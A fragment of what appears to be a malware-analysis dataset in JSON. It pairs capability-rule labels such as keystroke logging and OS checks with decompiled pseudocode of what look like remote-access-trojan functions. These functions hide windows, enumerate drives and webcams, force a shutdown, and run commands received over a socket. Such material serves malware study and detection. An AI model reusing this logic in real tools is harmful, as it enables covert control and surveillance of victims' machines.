        "decompiled_code": "\nvoid fcn.0048174c(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    \n    if (in_AL == '\\x01') {\n        uVar1 = sub.user32.dll_FindWindowA(0x4817a4, 0, 0, 0x48179c, 0, 0xffffffff);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n        return;\n    }\n    if (in_AL == '\\0') {\n        uVar1 = sub.user32.dll_FindWindowA(0x4817a4, 0, 0, 0x48179c, 0, 0);\n        uVar1 = sub.user32.dll_FindWindowExA(uVar1);\n        sub.user32.dll_EnableWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 191
    },
    "0048182c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048182c(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint uStack160;\n    uint uStack156;\n    uchar *puStack152;\n    uint var_88h;\n    uint lpClassName;\n    uint var_4h;\n    \n    puStack152 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack156 = 0x4818f6;\n    uStack160 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack160;\n    uVar1 = sub.user32.dll_FindWindowA(0x481904, 0);\n    for (iVar2 = func_0x00408148(uVar1, 5); iVar2 != 0; iVar2 = func_0x00408148(iVar2, 2)) {\n        iVar3 = sub.user32.dll_GetClassNameA(iVar2, &lpClassName, 0x80);\n        uVar4 = iVar3 == 0;\n        if (0 < iVar3) {\n            fcn.0040a9a4();\n            fcn.004096d8();\n            fcn.00405894();\n            if (uVar4) {\n                if (in_AL == '\\x01') {\n                    sub.user32.dll_ShowWindow(iVar2, 1);\n                }\n                else {\n                    sub.user32.dll_ShowWindow(iVar2, 0);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    fcn.0040546c(0x4818fd);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 378
    },
    "004826e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004826e0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.004826e0::var_1h + 1;\n    puStack44 = &fcn.004826e0::var_1h + 1;\n    uStack36 = 0x48276a;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x482743;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    fcn.00482674(&fcn.004826e0::var_8h);\n    (**(_pe_dos_header + 0x78))();\n    fcn.0040704c();\n    var_1h._0_1_ = var_8h != 1;\n    *in_FS_OFFSET = 0;\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x482771;\n    puStack44 = 0x482769;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 332
    },
    "00484200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __fastcall fcn.00484200(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uint var_150h;\n    uchar *var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    iVar2 = 0x29;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_10h = NULL;\n    puStack36 = 0x484228;\n    var_1ch = unaff_EDI;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack36 = 0x484230;\n    fcn.004058ec();\n    uStack40 = 0x48456a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x484246;\n    puStack36 = &stack0xfffffffc;\n    fcn.0040546c();\n    puStack48 = 0x484252;\n    var_14h = fcn.00420b38();\n    puStack48 = 0x484261;\n    var_18h = fcn.00404610();\n    puStack48 = 0x48426c;\n    fcn.00409dd8();\n    puStack48 = 0x484271;\n    fcn.004840f8();\n    uStack52 = 0x48452e;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack64 = 0x48451d;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack48 = &stack0xfffffffc;\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.00421314();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            var_1ch = iVar2;\n            (**(*var_18h + 0xc))();\n            cVar1 = fcn.00421454();\n            if (cVar1 == '\\x01') {\n                fcn.00405504();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x484590, var_ch, 0x484590, var_124h);\n                uStack64 = 0x484344;\n                fcn.004214dc();\n                uStack64 = var_128h;\n                uStack68 = 0x48459c;\n                fcn.00405800();\n            }\n            else if (cVar1 == '\\x03') {\n                fcn.00405504();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x484590, var_ch, 0x484590, var_130h);\n                uStack64 = 0x4843b9;\n                fcn.00421568();\n                uStack64 = 0x4843c4;\n                fcn.00409c6c();\n                uStack64 = var_134h;\n                uStack68 = 0x48459c;\n                fcn.00405800();\n            }\n            else if (cVar1 == '\\x02') {\n                fcn.00405504();\n                (**(*var_18h + 0xc))(*var_10h);\n                (**(*var_18h + 0xc))(0x484590, var_ch, 0x484590, var_13ch);\n                uStack64 = 0x48443c;\n                fcn.004214dc();\n                uStack64 = var_140h;\n                uStack68 = 0x48459c;\n                fcn.00405800();\n            }\n            if (cVar1 == '\\x04') {\n                arg_8h = 0x100;\n                (**(*var_18h + 0xc))();\n                iVar2 = fcn.00421598(arg_8h);\n                if (0 < iVar2) {\n                    fcn.00405504();\n                }\n                (**(*var_18h + 0xc))(*var_10h);\n                puStack48 = var_14ch;\n                uStack52 = 0x484590;\n                uStack56 = var_ch;\n                puStack60 = 0x484590;\n                uStack64 = 0x4844d5;\n                fcn.004056dc();\n                uStack64 = var_150h;\n                uStack68 = 0x48459c;\n                fcn.00405800();\n            }\n            var_1ch = var_1ch + -1;\n            iVar2 = var_1ch;\n        } while (var_1ch != 0);\n    }\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x484524;\n    uStack64 = 0x48450c;\n    fcn.00420be4();\n    uStack64 = 0x484514;\n    fcn.00404640();\n    uStack64 = 0x48451c;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 1444
    },
    "0048817c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_eh\n\nvoid fcn.0048817c(void)\n\n{\n    uint arg_8h;\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint uStackY140;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    int32_t var_eh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    *0x4 = 10;\n    do {\n        var_4h = 0;\n        *0x4 = *0x4 + -1;\n    } while (*0x4 != 0);\n    var_18h = 0x488345;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_1ch;\n    fVar4 = fcn.0040bbf4();\n    var_24h = SUB84(fVar4, 0);\n    var_20h = fVar4 >> 0x20;\n    fcn.0040b7fc(&var_8h, var_24h, var_20h);\n    fVar4 = fcn.0040bbf4();\n    var_30h = SUB84(fVar4, 0);\n    var_2ch = fVar4 >> 0x20;\n    fcn.0040badc(var_30h, var_2ch);\n    arg_8h = **0x4a4b98;\n    fcn.0044d8a8(arg_8h);\n    uVar1 = **0x4a4e0c;\n    fcn.0048c190(uVar1);\n    fcn.00409c6c(var_18h);\n    uVar2 = var_1ch;\n    fcn.00409c6c(0x48835c, var_1ch);\n    fcn.00409c6c(0x48835c, var_20h);\n    fcn.00409c6c(0x488368, var_24h);\n    fcn.00409c6c(&var_8h);\n    fcn.00409c6c(var_2ch);\n    fcn.00409c6c(var_30h);\n    fcn.00409c6c(arg_8h);\n    fcn.00405800(0x488374, uVar1);\n    fcn.00488118(var_14h);\n    fcn.00487d38(0x488384, uVar2);\n    fcn.00405800(0x48835c);\n    cVar3 = fcn.0044d9bc();\n    fcn.0044d99c();\n    if (cVar3 != '\\0') {\n        fcn.00488118();\n        fcn.00487d38(0x488384, 0x48835c);\n        fcn.00405800(var_24h);\n        uStackY140 = fcn.004058fc();\n        sub.kernel32.dll_DeleteFileA();\n    }\n    *in_FS_OFFSET = uStackY140;\n    fcn.00405490(0x48834c);\n    return;\n}\n",
        "token_count": 1054
    },
    "0048b5d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0048b5d8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char cVar3;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x48b719;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048b5d8::var_24h;\n    cVar3 = 'A';\n    var_10h = unaff_EBX;\n    do {\n        fcn.00405654();\n        fcn.00405738();\n        uVar1 = fcn.004058fc();\n        iVar2 = sub.kernel32.dll_GetDriveTypeA(uVar1);\n        uVar4 = iVar2 == 1;\n        if (1 < iVar2) {\n            fcn.0048d458();\n            fcn.0040a4d0();\n            fcn.00409a78();\n            var_24h = CONCAT31(CONCAT21(var_24h._2_2_, cVar3), 1);\n            fcn.00403990(var_10h);\n            fcn.00403960();\n            fcn.004056d0();\n            fcn.00409a78();\n            fcn.00405894();\n            if (uVar4) {\n                fcn.00405504();\n            }\n            else {\n                fcn.00405504();\n            }\n            uVar1 = var_4h;\n            fcn.00405654(var_4h);\n            fcn.00405800(0x48b760, var_8h, 0x48b754, 0x48b730, uVar1);\n        }\n        cVar3 = cVar3 + '\\x01';\n    } while (cVar3 != '[');\n    fcn.004054c0();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x48b720;\n    var_20h = 0x48b70b;\n    fcn.0040546c();\n    var_20h = 0x48b718;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 692
    },
    "0048b794": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0048b794(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004058fc(0);\n    iVar2 = sub.kernel32.dll_CreateDirectoryA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 64
    },
    "0048b7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0048b7b0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = fcn.004058fc();\n    uVar1 = fcn.004058fc(uVar1);\n    iVar2 = sub.kernel32.dll_MoveFileA(uVar1);\n    return iVar2 != 0;\n}\n",
        "token_count": 79
    },
    "0048bb88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048bb88(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack592;\n    uint uStack588;\n    uchar *puStack584;\n    uint var_234h;\n    uint var_230h;\n    uint var_218h;\n    uint var_110h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack584 = &stack0xfffffffc;\n    uStack588 = 0x48bca1;\n    uStack592 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdb0;\n    fcn.0040546c();\n    uVar1 = fcn.0044cf40();\n    iVar2 = fcn.0044cfa0();\n    while (iVar2 != 0) {\n        fcn.00409d80();\n        uVar4 = 0;\n        uVar3 = var_218h;\n        fcn.00409da8(var_218h);\n        fcn.004056dc(0, uVar3, uVar4);\n        uStack592 = 0x48bcdc;\n        fcn.00405800();\n        iVar2 = fcn.0044cfc0();\n    }\n    sub.kernel32.dll_CloseHandle_1();\n    fcn.004054c0();\n    *in_FS_OFFSET = uVar1;\n    uStack588 = 0x48bca8;\n    uStack592 = 0x48bc93;\n    fcn.0040546c();\n    uStack592 = 0x48bca0;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 384
    },
    "0048c2ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0048c2ec(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack560;\n    uint uStack556;\n    uchar *puStack552;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ah;\n    uint var_105h;\n    \n    puStack552 = &stack0xfffffffc;\n    uStack556 = 0x48c3b3;\n    uStack560 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd0;\n    iVar2 = 0;\n    while (iVar1 = sub.AVICAP32.DLL_capGetDriverDescriptionA\n                             (iVar2, &fcn.0048c2ec::var_105h, 0x105, &fcn.0048c2ec::var_20ah, 0x105),  iVar1 != 0) {\n        fcn.004056dc(*in_EAX);\n        fcn.004056dc(0x48c3cc, 0);\n        fcn.00405800(0x48c3d8, 0);\n        iVar2 = iVar2 + 1;\n    }\n    *in_FS_OFFSET = uStack560;\n    puStack552 = 0x48c3ba;\n    uStack556 = 0x48c3b2;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 325
    },
    "0048c3dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nulong fcn.0048c3dc(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack16 = 0x48c418;\n    uStack20 = 0x48c428;\n    iStack24 = 0x48c3ee;\n    iStack24 = sub.kernel32.dll_GetModuleHandleA_2();\n    pcVar1 = sub.kernel32.dll_GetProcAddress_1();\n    if (pcVar1 == NULL) {\n        unaff_EBX = 0;\n    }\n    else {\n        uVar2 = sub.kernel32.dll_GetCurrentProcess(&stack0xffffffe8);\n        iVar3 = (*pcVar1)(uVar2);\n        if (iVar3 != 0) {\n            unaff_EBX = iStack24 != 0;\n        }\n    }\n    return CONCAT44(iStack24, unaff_EBX);\n}\n",
        "token_count": 227
    },
    "0048d8a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0048d8a4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uchar auStack44 [40];\n    \n    if (**0x4a5164 == 2) {\n        uStack52 = 0x28;\n        uStack56 = 0x48d8bc;\n        puStack48 = &stack0xffffffd4;\n        uStack56 = sub.kernel32.dll_GetCurrentProcess();\n        puStack60 = 0x48d8c2;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            puStack60 = &stack0xffffffd4;\n            uStack64 = 0x48d934;\n            uVar2 = 0;\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0);\n            puStack60 = 0x1;\n            puStack48 = 0x2;\n            uStack64 = 0;\n            if (iVar1 != 0) {\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (uVar2, 0, &stack0xffffffc4, 0x10, &stack0xffffffd4, &stack0xffffffc0);\n            }\n        }\n    }\n    iVar1 = sub.user32.dll_ExitWindowsEx();\n    return iVar1 != 0;\n}\n",
        "token_count": 330
    },
    "0048e7a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e7a0(code *param_1)\n\n{\n    char in_AL;\n    char cVar1;\n    \n    cVar1 = fcn.0048e704();\n    if (cVar1 != '\\0') {\n        if (in_AL == '\\x01') {\n            (*param_1)(0xffffffff);\n        }\n        else {\n            (*param_1)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0048fcec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0048fcec(uint param_1, double *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    float10 fVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar auStack28 [16];\n    \n    uStack36 = *in_EAX;\n    uStack32 = in_EAX[1];\n    iVar1 = sub.kernel32.dll_FileTimeToSystemTime(&uStack36, auStack28);\n    if (iVar1 != 0) {\n        fVar2 = fcn.0040bafc();\n        *param_2 = fVar2;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 152
    },
    "00491220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00491220 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStackY8656;\n    uint uStackY8652;\n    uchar auStackY8249 [8025];\n    uint uStackY224;\n    uint uStackY220;\n    uint uStackY216;\n    uint uStackY212;\n    uint uStackY208;\n    int32_t iStackY204;\n    int32_t iStackY200;\n    uint uStackY196;\n    uint uStackY192;\n    uint uStackY188;\n    uchar *puStackY184;\n    uint uStackY180;\n    uint uStackY176;\n    uint var_34h;\n    int32_t var_30h;\n    uint uStack48;\n    uchar *var_28h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = &stack0xfffffffc;\n    iVar1 = 0x43e;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    puStack32 = 0x491244;\n    fcn.00405f08();\n    uStack36 = 0x4918ae;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x49183b;\n    var_30h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00491220::var_30h;\n    puStack32 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    var_30h = sub.wsock32.dll_socket();\n    if (var_30h == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_htons();\n    iVar1 = sub.wsock32.dll_inet_addr();\n    if ((iVar1 == -1) && (iVar1 = sub.wsock32.dll_gethostbyname(),  iVar1 == 0)) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_connect();\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    fcn.00405800();\n    fcn.0049393c();\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    fcn.0040a588();\n    fcn.00405784();\n    fcn.00403760();\n    **0x4a5028 = 1;\n    fcn.00403e74();\n    fcn.0040304c();\n    do {\n        fcn.00403ae4();\n        iVar1 = sub.wsock32.dll_recv();\n        uVar2 = iVar1 == 0;\n        if (iVar1 < 1) {\n            fcn.00403908();\n            fcn.0040304c();\n            fcn.00405894();\n            if (uVar2) {\n                uStackY176 = 0;\n                uStackY180 = 0;\n                puStackY184 = 0x491462;\n                fcn.0048d2c8();\n                puStackY184 = 0x491472;\n                fcn.00405738();\n                puStackY184 = 0x49147d;\n                puStackY184 = fcn.004058fc();\n                uStackY188 = 0x491900;\n                uStackY192 = 0;\n                uStackY196 = 0x49148a;\n                sub.shell32.dll_ShellExecuteA();\n            }\n            uStackY196 = 0x491497;\n            fcn.00405894();\n            if (uVar2) {\n                uStackY196 = 5;\n                iStackY200 = 0;\n                iStackY204 = 0;\n                uStackY208 = 0x4914aa;\n                fcn.0048d2c8();\n                uStackY208 = 0x4914ba;\n                fcn.00405738();\n                uStackY208 = 0x4914c5;\n                uStackY208 = fcn.004058fc();\n                uStackY212 = 0x491900;\n                uStackY216 = 0;\n                uStackY220 = 0x4914d2;\n                sub.shell32.dll_ShellExecuteA();\n            }\n            uStackY196 = 0x4914df;\n            fcn.00405894();\n            if (uVar2) {\n                uStackY196 = 0;\n                iStackY200 = 0;\n                iStackY204 = 0;\n                uStackY208 = 0x4914f2;\n                fcn.0048d2c8();\n                uStackY208 = 0x491502;\n                fcn.00405738();\n                uStackY208 = 0x49150d;\n                uStackY208 = fcn.004058fc();\n                uStackY212 = 0x491900;\n                uStackY216 = 0;\n                uStackY220 = 0x49151a;\n                sub.shell32.dll_ShellExecuteA();\n            }\n            uStackY196 = 0x491527;\n            fcn.00405894();\n            if (uVar2) {\n                uStackY196 = 5;\n                iStackY200 = 0;\n                iStackY204 = 0;\n                uStackY208 = 0x49153a;\n                fcn.0048d2c8();\n                uStackY208 = 0x49154a;\n                fcn.00405738();\n                uStackY208 = 0x491555;\n                uStackY208 = fcn.004058fc();\n                uStackY212 = 0x491900;\n                uStackY216 = 0;\n                uStackY220 = 0x491562;\n                sub.shell32.dll_ShellExecuteA();\n            }\n            uStackY196 = 0x49156f;\n            fcn.00405894();\n            if (uVar2) {\n                uStackY196 = 5;\n                iStackY200 = 0;\n                iStackY204 = 0;\n                uStackY208 = 0x491585;\n                fcn.0040a588();\n                uStackY208 = 0x491599;\n                fcn.00405784();\n                uStackY208 = 0x4915a4;\n                uStackY208 = fcn.004058fc();\n                uStackY212 = 0x491900;\n                uStackY216 = 0;\n                uStackY220 = 0x4915b1;\n                sub.shell32.dll_ShellExecuteA();\n                uVar2 = 1;\n                uStackY220 = 0x4915b8;\n                fcn.00492f94();\n            }\n            uStackY196 = 0x4915c5;\n            fcn.00405894();\n            if (uVar2) {\n                uStackY196 = 1;\n                iStackY200 = 0;\n                iStackY204 = 0x4915d6;\n                fcn.0048d2c8();\n                iStackY204 = 0x4915e6;\n                fcn.00405738();\n                iStackY204 = 0x4915f1;\n                iStackY204 = fcn.004058fc();\n                uStackY208 = 0x4915f7;\n                sub.winmm.dll_PlaySoundA();\n            }\n            uStackY196 = 0x491604;\n            fcn.00405894();\n            if (uVar2) {\n                uStackY196 = 0x491615;\n                fcn.0048d2c8();\n                uStackY196 = 0x491625;\n                fcn.00405738();\n                uStackY196 = 0x491630;\n                fcn.0040a1b0();\n                uStackY196 = 0;\n                iStackY200 = 0x49163d;\n                fcn.0048d2c8();\n                iStackY200 = uStackY8652;\n                iStackY204 = 0x4919a8;\n                uStackY208 = 0x491656;\n                fcn.0040a588();\n                uStackY208 = uStackY8656;\n                uStackY212 = 0x49166c;\n                fcn.00405800();\n                uStackY212 = 0x491677;\n                uStackY212 = fcn.004058fc();\n                uStackY216 = 0x491686;\n                fcn.0040a588();\n                uStackY216 = 0x49169a;\n                fcn.00405784();\n                uStackY216 = 0x4916a5;\n                uStackY216 = fcn.004058fc();\n                uStackY220 = 0x4916ab;\n                sub.kernel32.dll_CopyFileA();\n                uStackY220 = 0x4916b9;\n                fcn.0040a588();\n                uStackY220 = 0x4916cd;\n                fcn.00405784();\n                uStackY220 = 0x4916d8;\n                fcn.004058fc();\n                uStackY220 = 0x4916e5;\n                fcn.00405664();\n                uStackY220 = 0x4916fc;\n                uStackY220 = fcn.004058fc();\n                uStackY224 = 0x491702;\n                iVar1 = sub.kernel32.dll_DeleteFileA();\n                uVar2 = iVar1 == 0;\n            }\n            uStackY196 = 0x491715;\n            fcn.00405894();\n            if (uVar2) {\n                uStackY196 = 0x80;\n                iStackY200 = 0x49172b;\n                fcn.0048d390();\n                iStackY200 = 